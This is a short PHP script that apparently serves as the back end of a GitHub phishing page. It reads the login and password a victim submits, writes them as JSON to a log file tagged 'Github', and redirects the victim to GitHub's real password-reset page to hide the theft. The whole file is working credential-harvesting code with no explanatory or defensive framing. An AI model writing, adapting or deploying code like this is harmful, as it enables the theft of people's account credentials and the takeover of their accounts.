<?php

header('Location: https://github.com/password_reset');
$data = array('site' => 'Github',
  'user' => $_POST['login'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>